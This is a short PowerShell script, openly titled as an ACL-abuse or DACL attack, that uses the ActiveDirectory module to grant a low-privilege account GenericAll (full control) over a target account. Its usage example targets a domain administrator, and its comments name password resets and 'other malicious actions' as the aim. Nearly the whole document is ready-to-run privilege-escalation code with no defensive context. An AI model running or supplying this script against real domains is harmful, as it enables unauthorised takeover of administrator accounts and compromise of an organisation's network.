#############################################
#  ABUSE ACL TO ADD GENERICALL PERMISSION   #
#############################################
# Also known as: ACL Abuse / DACL Attack    #
#############################################
# Requires:
# - Permissions to read and write ACLs on the target object (or write access to that object)
# - Domain-joined machine
# - ActiveDirectory module
#
# Grants "low.priv" user full control (GenericAll) over the "domainadmin" account.
# This can be used to reset the admin's password or perform other malicious actions.

param(
    [Parameter(Mandatory=$true)]
    [string]$TargetUser,

    [Parameter(Mandatory=$true)]
    [string]$LowPrivUser
)

if (-not (Get-Module -ListAvailable -Name ActiveDirectory)) {
    Write-Error "ActiveDirectory module not found. Please install RSAT tools."
    exit
}
Import-Module ActiveDirectory

$Target = Get-ADUser -Identity $TargetUser
$LowPriv = Get-ADUser -Identity $LowPrivUser

$Identity = "$($LowPriv.DistinguishedName)"
$ACL = Get-Acl "AD:\$($Target.DistinguishedName)"
$Rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($Identity, "GenericAll", "Allow")
$ACL.AddAccessRule($Rule)
Set-Acl -Path "AD:\$($Target.DistinguishedName)" -AclObject $ACL

# Usage:
# .\weak_perms_on_user.ps1 -TargetUser "domainadmin" -LowPrivUser "low.priv"
